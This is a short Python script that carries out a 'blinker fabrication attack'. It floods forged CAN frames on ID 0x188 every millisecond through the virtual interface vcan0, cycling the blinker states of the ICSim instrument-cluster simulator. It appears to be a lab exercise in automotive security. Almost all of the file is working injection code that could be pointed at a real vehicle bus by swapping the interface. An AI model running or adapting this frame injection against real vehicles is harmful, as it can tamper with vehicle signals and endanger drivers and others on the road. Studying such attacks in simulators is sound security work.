import can
import time


try:
    bus = can.interface.Bus('vcan0', interface='socketcan')
    print("Connected to vcan0. Starting Blinker Fabrication Attack...")
except Exception as e:
    print(f"Error: {e}")
    exit()

# ID 0x188: Controls blinkers in ICSim 0x01 (Left), 0x02 (Right), 0x03 (Hazard), 0x00 (Off)
states = [
    [0x01, 0x00, 0x00, 0x00], 
    [0x02, 0x00, 0x00, 0x00], 
    [0x03, 0x00, 0x00, 0x00], 
    [0x00, 0x00, 0x00, 0x00]  
]

print("Injecting malicious frames every 1ms...")

try:
    counter = 0
    while True:
        msg_data = states[counter % len(states)]
        attack_msg = can.Message(
            arbitration_id=0x188, 
            data=msg_data, 
            is_extended_id=False
        )
        
        # High-frequency injection 
        bus.send(attack_msg)
        
        counter += 1
        time.sleep(0.001)
except KeyboardInterrupt:
    print("\nAttack stopped.")